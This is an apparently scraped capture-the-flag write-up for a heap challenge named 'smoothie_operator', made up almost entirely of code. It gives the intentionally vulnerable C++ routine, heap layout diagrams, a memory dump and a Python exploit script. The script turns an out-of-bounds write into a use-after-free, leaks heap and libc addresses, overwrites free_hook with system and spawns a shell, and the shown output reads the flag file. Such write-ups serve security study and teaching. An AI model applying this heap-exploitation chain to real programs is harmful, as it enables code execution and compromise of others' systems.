# Unknown

> 原文: https://www.ctfiot.com/78940.html
> ID: 78940


```
void Monster::
edit_params() {
 long long n;

 n = 0;
 for (; n < ARRSIZE; n++)
 std::
cout << n + 1 << ". " << FLAVORS[n] << std::
endl;

 printf("Choose an flavor to edit: ");
 std::
cin >> n;
 if (n < 0) goto fail;
 else {
 // vuln here - logic sequence error
 // entering index 0 allows an OOB write at quantities[0xff]
 n--;
 long long s = ARRSIZE;
 if (n < s) {
 std::
cout << "Enter a new quantity: ";
 std::
cin >> quantities[(uint8_t)n];
 return;
 }
 else { goto fail; }
 }

 fail:
 std::
cout << "[ ERROR ] : invalid flavor index\n";
 return;
}
| -- 1 -- | -- 2 -- | -- 3 -- | -- 4 -- | -- 5 -- | -- 6 -- | -- 7 -- | -- 8 -- |
| pad | chunk metadata |
| ptr to string data | size |
| data .... |
| -- 1 -- | -- 2 -- | -- 3 -- | -- 4 -- | -- 5 -- | -- 6 -- | -- 7 -- | -- 8 -- |
| pad | chunk metadata |
| ptr to string data | size |
| size | blank |

...
| -- 1 -- | -- 2 -- | -- 3 -- | -- 4 -- | -- 5 -- | -- 6 -- | -- 7 -- | -- 8 -- |
| pad | chunk metadata |
| string data... |
| |
...
metadata (on stack or wihtin dynamically allocated object)
| -- 1 -- | -- 2 -- | -- 3 -- | -- 4 -- | -- 5 -- | -- 6 -- | -- 7 -- | -- 8 -- |
| pad | chunk metadata |
| ptr to data start | ptr to data end |
| ptr to alloc end |

data (on heap)
| -- 1 -- | -- 2 -- | -- 3 -- | -- 4 -- | -- 5 -- | -- 6 -- | -- 7 -- | -- 8 -- |
| pad | chunk metadata |
| int1 | int 2 | int 3 | int 4 | < data end
| | | < allocation end
0x00 - 0x08 bytes: shared_ptr vtable
0x08 - 0x0c bytes: shared reference count
0x0c - 0x10 bytes: weak reference count
0x55b73c837a80:	0x0000000000000000	0x0000000000000061 << [ pad , allocation size | FLAGS ]
0x55b73c837a90:	0x000055b73be68980	0x0000000100000002 << [ vtable for shared_ptr<Monster> / weak count ]
0x55b73c837aa0:	0x000055b73be68a58	0x0000001400000021 << [ vtable for Monster, item number / dollars ]
0x55b73c837ab0:	0x0000000000000014	0x0000000000000000 << [ cents , (unused) ]
0x55b73c837ac0:	0x0000000000000001	0x000004d200000000 << [ order state , (unused) / quantities[0] ]
0x55b73c837ad0:	0x00001a85000011d7	0x0000000000000000 << [ quantities[2..3], quantities[4..5 ]
0x55b73c837ae0:	0x0000000000000000 << [ quantities[6..7],
# allocate pastry object which will originate the OOB write
 add_monster(33, [1234, 4567, 6789], 20, 20)

 # add pastry so that we can free it to populate 0x50 cache, if needed
 add_pastry(101, [1234, 4567, 6789], 20, 20)

 # fill space, need to align a pastry object 0xff * 4 bytes after
 # the array start in a Monster object (0xff * 4), or ~0x3f8 bytes
 # each complaint will allocate only a 0x30 chunk, so long as it
 # is 0x10 chars or less

 # start with a complaint to get the alignment on the heap correct
 add_complaint("B" * 0x58)

 # allocate a bunch of 0x30 structs, needed for flipping tcache and fastbins
 for i in range(10):
 add_complaint(chr(i + 0x31))

 # add pastry which is target of the overflow
 add_pastry(49, [ 0x414243, 0x414243, 0x414243 ], 0, 20)

 # overflow editing the original entry, clobbering order #49 shared_ptr control block
 edit_monster(33, 0, 0, 20, 20) # overwrites counter of shared pointer instances to 0
# fill tcache
 resolve_complaint(1)
 resolve_complaint(1)
 resolve_complaint(1)
 resolve_complaint(1)
 resolve_complaint(1)
 resolve_complaint(1)

 # free the clobbered shared_ptr by triggering any use, such as moving it to a new state
 prep_order(49)

 # dump queue, which should print a broken pointer in order #49
 leak1 = print_queue()
 leak1 = leak1[leak1.find("Order: #49") + len("Order: #49"):]
 leak1 = leak1[leak1.find("quantities:") + len("quantities:") + 1:]
 leak1 = int(leak1.split("\n")[1].split(" ")[-1]) + \
 (int(leak1.split("\n")[2].split(" ")[-1]) << 32)
 heap_addr = leak1
# consolidate heap to dump libc address. This pushes the UAF (in fastbins)
 # to smallbins, which links to the main arena
 add_complaint("B" * 0x2000)

 # leaded address is main_arena + 0x128 (smallbins for 0x30)
 leak2 = print_queue()
 leak2 = leak2[leak2.find("Order: #49") + len("Order: #49"):]
 leak2 = leak2[leak2.find("quantities:") + len("quantities:") + 1:]
 leak2 = int(leak2.split("\n")[1].split(" ")[-1]) + \
 (int(leak2.split("\n")[2].split(" ")[-1]) << 32)
 glibc_addr = leak2
 free_hook = glibc_addr + 0x2248
 system = free_hook - 0x19cbb8
 print(hex(free_hook))
# empty tcache and both 0x30 in smallbins (incl. UAF)
 for i in range(7):
 add_complaint(chr(i + 0x31))

 # move all chunks back to fill tcache and fastbins, with the
 # UAF in fastbins
 for i in range(7):
 resolve_complaint(7)
 resolve_complaint(1)

 # empty tcache and both 0x30 in smallbins
 # this puts the UAF overlapping a string, with the first index pointing to the
 # string data
 for i in range(9):
 add_complaint(chr(i + 0x31))

 ...

 # use the UAF to overwrite the string data pointer to free_hook
 # need to do it in two dword overwrites
 edit_pastry(49, 1, free_hook & 0xffffffff, 0, 20)
 edit_pastry(49, 2, free_hook >> 32, 0, 20)

 # edit the complaint, which now points at free hook, to &system
 edit_complaint(14, system.to_bytes(8, "little"))
# add string that has its own /bin/sh allocation, so pointer points right at c_str
 add_complaint("/" * 0x30 + "bin/sh")

 ...

 # free complaint 15 (/////.../bin/sh). It's giving shell
 p.send(b'9\n')
 p.recvuntil(b"> ")
 p.send(b'15\n')

 p.interactive()
[+] Opening connection to 127.0.0.1 on port 6666: Done
0x55ba35f28e40
0x7f5949957e48
[*] Switching to interactive mode
$ ls
flag.txt
smoothie_operator
$ cat flag.txt
Sh4r3d_ptrs_R_sm00th$
make build
make host
cd exp; python3 exploit.py
```
